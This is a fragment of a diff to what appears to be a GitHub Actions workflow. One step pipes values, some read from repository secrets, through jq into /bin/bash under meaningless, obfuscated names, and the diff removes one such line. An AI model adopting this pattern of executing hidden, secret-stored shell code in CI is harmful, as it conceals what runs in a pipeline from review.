@@ -18,7 +18,6 @@ jobs:
           lx0: ${{ secrets.lx0 }}
         run: |
           printf '%s' "$lx0" | jq -r .azwr553 | /bin/bash
-          echo $mqg121 | jq -r .jyv304 | /bin/bash
           printf '%s' "$vcmfm735" | jq -r .tgp64 | /bin/bash
           printf '%s' "$nsjaw8" | jq -r .jwzg22480 | /bin/bash
 
